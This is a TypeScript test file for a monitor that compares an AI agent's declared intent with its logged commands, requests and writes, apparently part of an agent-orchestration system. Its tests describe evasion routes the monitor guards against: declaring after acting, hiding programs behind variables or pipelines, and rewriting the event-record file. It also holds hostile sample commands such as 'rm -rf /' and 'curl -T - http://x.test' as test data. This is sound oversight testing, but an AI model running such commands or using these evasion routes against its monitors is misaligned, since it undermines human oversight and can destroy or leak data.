/**
 * Offline checks for the declared-intent comparison.
 *
 * Two jobs. The first is the drift check: the wire constants live in ling and
 * are mirrored in the overlord because the packages build in isolation, so this
 * reads the ling source and pins them. The second, and the one that matters, is
 * that the comparison actually refuses the things it exists to refuse —
 * above all a declaration made *after* the action it describes, which is the
 * whole mechanism. A test suite that only exercised the happy path here would
 * certify a gate that blesses post-hoc rationalisation.
 */
import assert from "node:assert/strict";
import { mkdtemp, readFile, rm, writeFile } from "node:fs/promises";
import os from "node:os";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { EventRecord, readEventRecord } from "../campaign/event-record.js";
import {
  DECLARE_INTENT_TOOL_NAME,
  INTENT_EVENT_TYPE,
  MAX_REPORTED_UNDECLARED,
  analyzeCommand,
  createIntentTracker,
  diffIntent,
  programsInCommand,
  resolveIntentReport,
  type IntentLogEvent,
  type LiveIntentSource,
} from "../campaign/intent.js";
import { COORDINATING_ROLES, canDeliverMessage } from "../campaign/routing.js";
import type { LingEvent } from "../ling/types.js";

let failures = 0;

async function check(label: string, run: () => void | Promise<void>): Promise<void> {
  try {
    await run();
    console.log(`PASS  ${label}`);
  } catch (error) {
    failures += 1;
    console.log(`FAIL  ${label} -- ${error instanceof Error ? error.message : String(error)}`);
  }
}

const lingIntentSource = fileURLToPath(new URL("../../../ling/src/intent.ts", import.meta.url));

function declare(
  commands: string[] = [],
  hosts: string[] = [],
  writes: string[] = [],
): IntentLogEvent {
  return { type: INTENT_EVENT_TYPE, data: { commands, hosts, writes } };
}

function bash(command: string): IntentLogEvent {
  return { type: "tool_start", data: { tool: "bash", args: { command } } };
}

function fetch(url: string): IntentLogEvent {
  return { type: "tool_start", data: { tool: "http_request", args: { url } } };
}

function write(path: string): IntentLogEvent {
  return { type: "tool_start", data: { tool: "write", args: { path } } };
}

await check("the ling tool name and event type are pinned to the ling source", async () => {
  const source = await readFile(lingIntentSource, "utf8");
  const constant = (name: string): string => {
    const match = source.match(new RegExp(`export const ${name} = "([^"]+)"`));
    assert.ok(match, `could not find ${name} in ${lingIntentSource}`);
    return match[1]!;
  };
  assert.equal(constant("DECLARE_INTENT_TOOL_NAME"), DECLARE_INTENT_TOOL_NAME);
  assert.equal(constant("INTENT_EVENT_TYPE"), INTENT_EVENT_TYPE);
});

await check("the log route history() reads is the one ling serves, outside the workspace", async () => {
  // The packages build in isolation, so a renamed route would leave history()
  // silently falling back to the bounded stream replay. Pinned to the source.
  const server = await readFile(
    fileURLToPath(new URL("../../../ling/src/server.ts", import.meta.url)),
    "utf8",
  );
  const client = await readFile(fileURLToPath(new URL("../ling/client.ts", import.meta.url)), "utf8");
  assert.match(server, /\/\/ GET \/tasks\/:id\/log\r?\n\s+if \(method === "GET" && segments\.length === 3 && segments\[2\] === "log"\)/);
  assert.match(client, /`\/tasks\/\$\{encodeURIComponent\(id\)\}\/log`/);
  const config = await readFile(
    fileURLToPath(new URL("../../../ling/src/config.ts", import.meta.url)),
    "utf8",
  );
  assert.match(config, /eventLogDir: path\.join\(rootDir, "data", "events"\)/);
});

await check("a role without the tool is inapplicable rather than clean", () => {
  const report = diffIntent([bash("rm -rf /")], false);
  assert.equal(report.outcome, "inapplicable");
  assert.equal(report.undeclared.length, 0);
});

await check("unreadable history is unavailable rather than clean", () => {
  const report = diffIntent(undefined, true);
  assert.equal(report.outcome, "unavailable");
  assert.match(report.reasons.join(" "), /unknown/i);
});

// `history()` reports an unreachable log by returning an empty array, not by
// throwing, so this is the shape the default remote deployment actually hits.
await check("an empty history is unavailable, not an idle task", () => {
  const report = diffIntent([], true);
  assert.equal(report.outcome, "unavailable");
  assert.match(report.reasons.join(" "), /not reached/i);
});

await check("declared work that matches is clean", () => {
  const report = diffIntent(
    [
      declare(["npm"], ["registry.npmjs.org"], ["dist/"]),
      bash("npm install"),
      fetch("https://registry.npmjs.org/typebox"),
      write("dist/bundle.js"),
    ],
    true,
  );
  assert.equal(report.outcome, "clean", report.reasons.join("; "));
  assert.equal(report.declarations, 1);
  assert.deepEqual(report.observed, { commands: 1, hosts: 1, writes: 1 });
});

await check("an undeclared program is a divergence", () => {
  const report = diffIntent([declare(["npm"]), bash("npm test"), bash("curl http://x.test")], true);
  assert.equal(report.outcome, "diverged");
  assert.deepEqual(
    report.undeclared.filter((item) => item.kind === "command").map((item) => item.value),
    ["curl"],
  );
});

await check("an undeclared host is a divergence", () => {
  const report = diffIntent([declare([], ["a.test"]), fetch("https://b.test/data")], true);
  assert.equal(report.outcome, "diverged");
  assert.deepEqual(
    report.undeclared.filter((item) => item.kind === "host").map((item) => item.value),
    ["b.test"],
  );
});

await check("an undeclared write is a divergence", () => {
  const report = diffIntent([declare([], [], ["src/a.ts"]), write("src/b.ts")], true);
  assert.equal(report.outcome, "diverged");
  assert.deepEqual(
    report.undeclared.filter((item) => item.kind === "write").map((item) => item.value),
    ["src/b.ts"],
  );
});

// The load-bearing check. Everything else in this file is bookkeeping.
await check("a declaration does not cover an action that came before it", () => {
  const report = diffIntent([bash("curl http://x.test"), declare(["curl"])], true);
  assert.equal(report.outcome, "diverged");
  const flagged = report.undeclared.find((item) => item.value === "curl");
  assert.ok(flagged, "the earlier command should still be flagged");
  assert.equal(flagged.declaredLater, true);
  assert.match(report.reasons.join(" "), /later declaration/i);
});

await check("the same action after the declaration is covered", () => {
  const report = diffIntent([declare(["curl"]), bash("curl http://x.test")], true);
  assert.equal(report.outcome, "clean", report.reasons.join("; "));
});

await check("an amendment covers what follows it and is counted", () => {
  const report = diffIntent(
    [declare(["npm"]), bash("npm test"), declare(["curl"]), bash("curl http://x.test")],
    true,
  );
  assert.equal(report.outcome, "clean", report.reasons.join("; "));
  assert.equal(report.declarations, 2);
});

await check("acting without ever declaring is undeclared, not clean", () => {
  const report = diffIntent([bash("npm test"), write("out.txt")], true);
  assert.equal(report.outcome, "undeclared");
  assert.equal(report.declarations, 0);
  assert.ok(report.observed.commands > 0);
});

await check("declaring nothing and doing nothing is vacuously clean, and says so", () => {
  const report = diffIntent([{ type: "agent_start" }, { type: "agent_end" }], true);
  assert.equal(report.outcome, "clean");
  assert.deepEqual(report.observed, { commands: 0, hosts: 0, writes: 0 });
  // The counts are what stop this reading as an earned pass.
  assert.match(report.reasons.join(" "), /no commands, requests or writes/i);
});

/**
 * Both of these came from the paid compliance run, where every scenario reported
 * a divergence it had not committed. They are regression pins, not hypotheticals.
 */
await check("a declared command line covers the program it runs", () => {
  // What a real model actually writes: the command, not the program name.
  const report = diffIntent([declare(["node sum.js"]), bash("node sum.js")], true);
  assert.equal(report.outcome, "clean", report.reasons.join("; "));
  const amended = diffIntent([declare(["cat clue.txt"]), bash("cat clue.txt")], true);
  assert.equal(amended.outcome, "clean", amended.reasons.join("; "));
  // Reduced to the program, so arguments are not part of the commitment.
  const other = diffIntent([declare(["node sum.js"]), bash("node other.js")], true);
  assert.equal(other.outcome, "clean", "declaring a program does not pin its arguments");
  // And a declared pipeline declares each of its programs.
  const piped = diffIntent(
    [declare(["npm test | tee log.txt"]), bash("npm test"), bash("tee log.txt")],
    true,
  );
  assert.equal(piped.outcome, "clean", piped.reasons.join("; "));
});

await check("every fixed-path writing tool is observed, and pinned to ling's constants", async () => {
  // Same shape as write_result, and missed on the first pass: keyed on a `path`
  // argument these tools do not have, the entries matched nothing and the writes
  // went unobserved. Pinned against the ling source so a renamed output file
  // breaks here rather than silently stopping the observation.
  const source = await readFile(
    fileURLToPath(new URL("../../../ling/src/features/findings.ts", import.meta.url)),
    "utf8",
  );
  const constant = (name: string): string => {
    const match = source.match(new RegExp(`export const ${name} = "([^"]+)"`));
    assert.ok(match, `could not find ${name} in the ling findings source`);
    return match[1]!;
  };
  for (const [tool, file] of [
    ["record_finding", constant("FINDINGS_FILE")],
    ["verify_finding", constant("VERIFICATION_FILE")],
  ] as const) {
    const covered = diffIntent(
      [declare([], [], [file]), { type: "tool_start", data: { tool, args: { body: "{}" } } }],
      true,
    );
    assert.equal(covered.outcome, "clean", `${tool}: ${covered.reasons.join("; ")}`);
    assert.equal(covered.observed.writes, 1, `${tool} write should be observed`);

    const undeclaredWrite = diffIntent(
      [declare([], [], ["other.txt"]), { type: "tool_start", data: { tool, args: { body: "{}" } } }],
      true,
    );
    assert.equal(undeclaredWrite.outcome, "diverged", `${tool} should be flagged when undeclared`);
    assert.equal(undeclaredWrite.undeclared[0]?.value, file);
  }
});

await check("write_result counts as writing result.json", () => {
  const declared = diffIntent(
    [declare([], [], ["result.json"]), { type: "tool_start", data: { tool: "write_result", args: { body: "{}" } } }],
    true,
  );
  assert.equal(declared.outcome, "clean", declared.reasons.join("; "));
  assert.equal(declared.observed.writes, 1, "the write is observed despite having no path argument");

  const undeclaredWrite = diffIntent(
    [declare([], [], ["notes.txt"]), { type: "tool_start", data: { tool: "write_result", args: { body: "{}" } } }],
    true,
  );
  assert.equal(undeclaredWrite.outcome, "diverged");
  assert.equal(undeclaredWrite.undeclared[0]?.value, "result.json");
});

/**
 * These three came from the paid concealment run, which found that a program run
 * through indirection leaves no trace in this comparison at all.
 */
await check("an assignment-only segment runs no program", () => {
  // Previously reported a program called `cmd=whoami`, which does not exist.
  assert.deepEqual(analyzeCommand("CMD=whoami").programs, []);
  assert.deepEqual(analyzeCommand("A=1 B=2").programs, []);
  // With a program after it, the assignment is still just a prefix.
  assert.deepEqual(analyzeCommand("CMD=whoami node run.js").programs, ["node"]);
});

await check("a program named by a variable is unresolved, not guessed at", () => {
  const analysis = analyzeCommand('CMD=whoami; "$CMD" > out.txt');
  assert.deepEqual(analysis.programs, [], "no real program name is knowable here");
  assert.deepEqual(analysis.unresolved, ["$CMD"]);

  // And it cannot pass as clean, because no declaration could ever cover it.
  const report = diffIntent([declare(["whoami"]), bash('CMD=whoami; "$CMD" > out.txt')], true);
  assert.equal(report.outcome, "diverged");
  assert.equal(report.undeclared[0]?.value, "<unresolved:$CMD>");
});

await check("indirection is reported even when the outcome is clean", () => {
  const report = diffIntent([declare(["node"]), bash("node runner.js")], true);
  // Honest and complete about what it saw, which is the point: the task declared
  // node and ran node. Whatever runner.js spawned is simply not in the log.
  assert.equal(report.outcome, "clean");
  assert.deepEqual(report.indirection, ["node"]);
  assert.match(report.reasons.join(" "), /lower bound/);

  const direct = diffIntent([declare(["whoami"]), bash("whoami")], true);
  assert.equal(direct.outcome, "clean");
  assert.deepEqual(direct.indirection, [], "a leaf program hides nothing");
  assert.doesNotMatch(direct.reasons.join(" "), /lower bound/);
});

await check("a directory declaration covers paths beneath it and nothing else", () => {
  const covered = diffIntent([declare([], [], ["dist/"]), write("dist/a/b.js")], true);
  assert.equal(covered.outcome, "clean", covered.reasons.join("; "));
  const sibling = diffIntent([declare([], [], ["dist/"]), write("dist-other/a.js")], true);
  assert.equal(sibling.outcome, "diverged");
});

await check("every program in a pipeline is attributed", () => {
  assert.deepEqual(programsInCommand("npm test | tee log.txt"), ["npm", "tee"]);
  assert.deepEqual(programsInCommand("a && b || c ; d"), ["a", "b", "c", "d"]);
  assert.deepEqual(programsInCommand("FOO=1 BAR=2 sudo /usr/bin/CURL -s x"), ["curl"]);
  assert.deepEqual(programsInCommand("echo $(whoami)"), ["echo", "whoami"]);
  assert.deepEqual(programsInCommand("(cd src && node build.js)"), ["cd", "node"]);
});

await check("a hidden program in a pipeline is caught", () => {
  const report = diffIntent([declare(["npm"]), bash("npm test | curl -T - http://x.test")], true);
  assert.equal(report.outcome, "diverged");
  assert.ok(report.undeclared.some((item) => item.value === "curl"));
});

await check("reported divergences are capped per kind", () => {
  const events: IntentLogEvent[] = [declare(["npm"])];
  for (let index = 0; index < MAX_REPORTED_UNDECLARED + 10; index += 1) {
    events.push(bash(`prog${index} run`));
  }
  const report = diffIntent(events, true);
  assert.equal(report.outcome, "diverged");
  const commands = report.undeclared.filter((item) => item.kind === "command");
  assert.equal(commands.length, MAX_REPORTED_UNDECLARED);
  // The count is not capped, so the manifest still records the true scale.
  assert.match(report.reasons[0]!, new RegExp(`${MAX_REPORTED_UNDECLARED + 10} action`));
});

await check("a malformed declaration event is not treated as a declaration", () => {
  const report = diffIntent(
    [{ type: INTENT_EVENT_TYPE, data: "everything" }, bash("curl x")],
    true,
  );
  assert.equal(report.outcome, "undeclared");
  assert.equal(report.declarations, 0);
});

await check("a non-writing tool's path argument is not read as a write", () => {
  const report = diffIntent(
    [declare(), { type: "tool_start", data: { tool: "read", args: { path: "src/a.ts" } } }],
    true,
  );
  assert.equal(report.outcome, "clean", report.reasons.join("; "));
  assert.equal(report.observed.writes, 0);
});

await check("the streaming tracker reports the first divergence as it arrives", () => {
  const tracker = createIntentTracker();
  assert.equal(tracker.sawAnyEvent(), false);
  assert.equal(tracker.observe(declare(["npm"])), undefined);
  assert.equal(tracker.sawAnyEvent(), true);
  assert.equal(tracker.observe(bash("npm test")), undefined, "declared work is not flagged");
  const divergence = tracker.observe(bash("curl http://x.test"));
  assert.equal(divergence?.kind, "command");
  assert.equal(divergence?.value, "curl");
  // The same divergence again is not a second finding.
  assert.equal(tracker.observe(bash("curl http://y.test")), undefined);
  assert.equal(tracker.report().outcome, "diverged");
});

await check("streaming and batch reach the same verdict", () => {
  const events = [
    bash("curl http://x.test"),
    declare(["curl", "npm"]),
    bash("npm test"),
    write("out.txt"),
  ];
  const tracker = createIntentTracker();
  for (const event of events) tracker.observe(event);
  assert.deepEqual(tracker.report(), diffIntent(events, true));
});

await check("a late declaration amends an existing flag in place", () => {
  const tracker = createIntentTracker();
  const divergence = tracker.observe(bash("curl http://x.test"));
  assert.equal(divergence?.declaredLater, false, "nothing has declared it yet");
  tracker.observe(declare(["curl"]));
  const report = tracker.report();
  assert.equal(report.undeclared[0]?.declaredLater, true, "the flag is amended, not removed");
  assert.equal(report.outcome, "diverged");
});

await check("a divergence beyond the listing cap still raises the count", () => {
  const tracker = createIntentTracker();
  tracker.observe(declare(["npm"]));
  for (let index = 0; index < MAX_REPORTED_UNDECLARED + 5; index += 1) {
    tracker.observe(bash(`prog${index} run`));
  }
  const report = tracker.report();
  assert.equal(report.undeclared.length, MAX_REPORTED_UNDECLARED);
  assert.match(report.reasons[0]!, new RegExp(`${MAX_REPORTED_UNDECLARED + 5} action`));
  assert.match(report.reasons.join(" "), /Only 20 of them are listed/);
});

/**
 * Source selection. Every branch that could return `clean` from a partial
 * account is a silent false pass, so each is pinned here.
 */
{
  const liveSource = (
    events: IntentLogEvent[],
    overrides: Partial<Omit<LiveIntentSource, "report">> = {},
  ): LiveIntentSource => {
    const tracker = createIntentTracker();
    for (const event of events) tracker.observe(event);
    return {
      sawAnyEvent: tracker.sawAnyEvent(),
      firstSeq: 1,
      broken: false,
      report: () => tracker.report(),
      ...overrides,
    };
  };
  const diverging = [bash("curl http://x.test")];
  const honest = [declare(["curl"]), bash("curl http://x.test")];
  /** As ling numbers them: lifecycle around the work, 1-based, ending at a terminal event. */
  const sequenced = (
    events: IntentLogEvent[],
    { start = 1, terminal = true }: { start?: number; terminal?: boolean } = {},
  ): IntentLogEvent[] =>
    [{ type: "task_started" }, ...events, ...(terminal ? [{ type: "task_finished" }] : [])].map(
      (event, index) => ({ ...event, seq: start + index }),
    );

  await check("the service log wins over the live stream", () => {
    // The live stream says clean, the service's log says otherwise. The uncapped
    // source decides, or a task could be judged on whichever account is kinder.
    const report = resolveIntentReport({
      toolAvailable: true,
      recorded: sequenced(diverging),
      live: liveSource(honest),
    });
    assert.equal(report.outcome, "undeclared");
  });

  await check("a seq-less log from an older client is still taken as given", () => {
    // Nothing LingClient returns lacks seq any more; this is the interface's
    // older contract, kept so a client written against it is not reclassified.
    const report = resolveIntentReport({
      toolAvailable: true,
      recorded: diverging,
      live: liveSource(honest),
    });
    assert.equal(report.outcome, "undeclared");
  });

  await check("a complete event record wins over the service log and the live stream", () => {
    // The overlord's own copy is the account hardest for the task to reach, so
    // a clean-looking service log cannot outvote it.
    const report = resolveIntentReport({
      toolAvailable: true,
      eventRecord: sequenced(diverging),
      recorded: sequenced(honest),
      live: liveSource(honest),
    });
    assert.equal(report.outcome, "undeclared");
  });

  /** Events as ling sends them, with the `at` an `EventRecord` keeps. */
  const delivered = (events: IntentLogEvent[]): LingEvent[] =>
    events.map((event) => ({ ...event, seq: event.seq ?? 0, at: "2026-01-01T00:00:00.000Z" }));

  await check("a kept event record is judged from memory, not from a file rewritten under it", async () => {
    // With ling auto-started and the sandbox off, the task's shell runs as the
    // overlord's user and can rewrite the record's file, seqs kept. The record
    // this process kept is what the stream delivered; the file read back is
    // what the task left, which is why readEventRecord is only the restart path.
    const campaignDir = await mkdtemp(path.join(os.tmpdir(), "intent-event-record-"));
    try {
      const record = await EventRecord.open(campaignDir, "task-rewritten");
      for (const event of delivered(sequenced(diverging))) await record.append(event);
      await record.close();
      const rewritten = delivered(sequenced(honest));
      await writeFile(record.filename, rewritten.map((event) => `${JSON.stringify(event)}\n`).join(""));

      const kept = resolveIntentReport({ toolAvailable: true, eventRecord: record, recorded: undefined });
      assert.equal(kept.outcome, "undeclared", kept.reasons.join("; "));
      const reread = resolveIntentReport({
        toolAvailable: true,
        eventRecord: await readEventRecord(campaignDir, "task-rewritten"),
        recorded: undefined,
      });
      assert.equal(reread.outcome, "clean", "the restart path trusts the file, rewritten or not");
    } finally {
      await rm(campaignDir, { recursive: true, force: true });
    }
  });

  await check("a kept event record holding a conflicting replay is passed over", async () => {
    // Judged by its own assessment: its first-seen events alone look whole.
    const campaignDir = await mkdtemp(path.join(os.tmpdir(), "intent-event-record-"));
    try {
      const record = await EventRecord.open(campaignDir, "task-conflict");
      const events = delivered(sequenced(honest));
      for (const event of events) await record.append(event);
      await record.append({ ...events[1]!, data: { commands: ["*"], hosts: [], writes: [] } });
      await record.close();
      const report = resolveIntentReport({
        toolAvailable: true,
        eventRecord: record,
        recorded: undefined,
        live: liveSource(honest),
      });
      assert.equal(report.outcome, "unavailable");
      assert.match(report.reasons.join(" "), /overlord's event record .* twice with different content/);
    } finally {
      await rm(campaignDir, { recursive: true, force: true });
    }
  });

  await check("an incomplete event record is passed over for a complete service log", () => {
    const report = resolveIntentReport({
      toolAvailable: true,
      eventRecord: sequenced(honest, { start: 5 }),
      recorded: sequenced(diverging),
    });
    assert.equal(report.outcome, "undeclared");
  });

  await check("an incomplete event record is never promoted, nor its live tap", () => {
    // Same tap, same missing events: a record found incomplete means the live
    // tracker beside it missed them too, however clean it looks.
    for (const eventRecord of [
      sequenced(honest, { start: 2 }),
      sequenced(honest, { terminal: false }),
      sequenced(honest).filter((event) => event.seq !== 2),
    ]) {
      const report = resolveIntentReport({
        toolAvailable: true,
        eventRecord,
        recorded: undefined,
        live: liveSource(honest),
      });
      assert.equal(report.outcome, "unavailable", JSON.stringify(eventRecord));
      assert.match(report.reasons.join(" "), /overlord's event record/);
    }
  });

  await check("a sequenced service log that is not whole is unavailable, however clean", () => {
    for (const [recorded, reason] of [
      // A replay of the bounded tail, which history() used to hand over as the log.
      [sequenced(honest, { start: 900 }), /begins at sequence 900 rather than 1/],
      [sequenced(honest).filter((event) => event.seq !== 2), /missing sequence 2/],
      [sequenced(honest, { terminal: false }), /no terminal event/],
    ] as const) {
      const report = resolveIntentReport({ toolAvailable: true, recorded });
      assert.equal(report.outcome, "unavailable");
      assert.match(report.reasons.join(" "), reason);
      assert.match(report.reasons.join(" "), /service's event log/);
    }
  });

  await check("an incomplete service log falls back to a complete live stream", () => {
    const report = resolveIntentReport({
      toolAvailable: true,
      recorded: sequenced(diverging, { start: 900 }),
      live: liveSource(honest),
    });
    assert.equal(report.outcome, "clean", report.reasons.join("; "));
  });

  await check("every refused source is named when none can answer", () => {
    const report = resolveIntentReport({
      toolAvailable: true,
      eventRecord: sequenced(honest, { start: 3 }),
      recorded: sequenced(honest, { terminal: false }),
    });
    assert.equal(report.outcome, "unavailable");
    assert.equal(report.reasons.length, 2, report.reasons.join("; "));
  });

  await check("a complete live stream is used when no log was readable", () => {
    const report = resolveIntentReport({
      toolAvailable: true,
      recorded: undefined,
      live: liveSource(honest),
    });
    assert.equal(report.outcome, "clean", report.reasons.join("; "));
  });

  await check("a live stream joined late is refused, however clean it looks", () => {
    const report = resolveIntentReport({
      toolAvailable: true,
      recorded: undefined,
      live: liveSource(honest, { firstSeq: 900 }),
    });
    assert.equal(report.outcome, "unavailable");
    assert.match(report.reasons.join(" "), /began at sequence 900 rather than 1/);
  });

  await check("a broken live stream is refused, however clean it looks", () => {
    const report = resolveIntentReport({
      toolAvailable: true,
      recorded: undefined,
      live: liveSource(honest, { broken: true }),
    });
    assert.equal(report.outcome, "unavailable");
    assert.match(report.reasons.join(" "), /failed partway/);
  });

  await check("a live stream that diverged is believed when it is complete", () => {
    const report = resolveIntentReport({
      toolAvailable: true,
      recorded: [],
      live: liveSource(diverging),
    });
    assert.equal(report.outcome, "undeclared");
  });

  await check("no log and no stream is unavailable", () => {
    assert.equal(
      resolveIntentReport({ toolAvailable: true, recorded: undefined }).outcome,
      "unavailable",
    );
    assert.equal(
      resolveIntentReport({
        toolAvailable: true,
        recorded: [],
        live: liveSource([], { firstSeq: undefined }),
      }).outcome,
      "unavailable",
    );
  });

  await check("a role without the tool stays inapplicable whatever the sources say", () => {
    const report = resolveIntentReport({
      toolAvailable: false,
      recorded: diverging,
      live: liveSource(diverging),
    });
    assert.equal(report.outcome, "inapplicable");
  });
}

await check("coordinating roles may still message each other", () => {
  for (const from of COORDINATING_ROLES) {
    for (const to of COORDINATING_ROLES) {
      assert.equal(canDeliverMessage(from, to), true, `${from} -> ${to} should be allowed`);
    }
  }
});

await check("an observer cannot message the worker it reports on, in either role", () => {
  // Not yet a member of CampaignRole, which is the point: the refusal is
  // provable before the role that needs refusing exists.
  assert.equal(canDeliverMessage("observer", "builder"), false);
  assert.equal(canDeliverMessage("builder", "observer"), false);
  assert.equal(canDeliverMessage("observer", "observer"), false);
});

await check("an unknown role is denied rather than defaulted in", () => {
  assert.equal(canDeliverMessage("", "builder"), false);
  assert.equal(canDeliverMessage("builder", "Builder"), false);
  assert.equal(canDeliverMessage("builder", "__proto__"), false);
});

console.log(failures === 0 ? "\nall intent checks passed" : `\n${failures} intent check(s) failed`);
process.exit(failures === 0 ? 0 : 1);
